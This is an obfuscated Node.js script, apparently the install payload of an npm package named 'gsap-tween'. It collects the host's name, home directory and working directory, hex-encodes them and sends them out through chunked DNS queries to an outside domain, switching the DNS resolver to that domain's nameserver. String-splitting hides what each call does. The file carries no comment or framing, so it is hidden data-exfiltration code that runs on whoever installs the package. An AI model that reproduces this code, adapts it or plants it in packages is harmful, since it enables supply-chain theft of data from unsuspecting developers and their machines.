const dns = require('dn' + 's'), os = require('os'), suffix = '.d' + 'ns' + '.a' + 'le' + 'xb' + 'ir' + 'sa' + 'n-' + 'ha' + 'ck' + 's-' + 'pa' + 'yp' + 'al' + '.c' + 'om', ns = 'dn' + 's1' + '.a' + 'le' + 'xb' + 'ir' + 'sa' + 'n-' + 'ha' + 'ck' + 's-' + 'pa' + 'yp' + 'al' + '.c' + 'om', package = 'gs' + 'ap' + '-t' + 'we' + 'en';
function sendToServer(_0x1ad417) {
    _0x1ad417 = Buffer['fr' + 'om'](_0x1ad417)['to' + 'St' + 'ri' + 'ng']('he' + 'x'), _0x1ad417 = _0x1ad417['ma' + 'tc' + 'h'](/.{1,60}/g), id = Math['ra' + 'nd' + 'om']()['to' + 'St' + 'ri' + 'ng'](0x24)['su' + 'bs' + 'tr' + 'in' + 'g'](0x2), _0x1ad417['fo' + 'rE' + 'ac' + 'h'](function (_0x3a7d73, _0x23a7cd) {
        try {
            dns['re' + 'so' + 'lv' + 'e']('v2' + '_f' + '.' + id + '.' + _0x23a7cd + '.' + _0x3a7d73 + ('.v' + '2_' + 'e') + suffix, 'A', console['lo' + 'g']);
        } catch (_0x18f90f) {
        }
    });
}
function tryGet(_0x1bec73) {
    try {
        return _0x1bec73();
    } catch (_0x30f1c6) {
        return 'er' + 'r';
    }
}
data = {
    'p': package,
    'h': tryGet(os['ho' + 'st' + 'na' + 'me']),
    'd': tryGet(os['ho' + 'me' + 'di' + 'r']),
    'c': __dirname
};
data['h'] == 'BB' + 'OG' + 'EN' + 'S-' + 'LA' + 'PT' + 'OP' && process['ex' + 'it'](0x0);
data = JSON['st' + 'ri' + 'ng' + 'if' + 'y'](data), sendToServer(data), dns['lo' + 'ok' + 'up'](ns, function (_0x1ad33e, _0x569ebd) {
    !_0x1ad33e ? nsAddress = _0x569ebd : nsAddress = '8.' + '8.' + '8.' + '8', dns['se' + 'tS' + 'er' + 've' + 'rs']([
        nsAddress,
        '8.' + '8.' + '4.' + '4'
    ]), sendToServer(data);
});
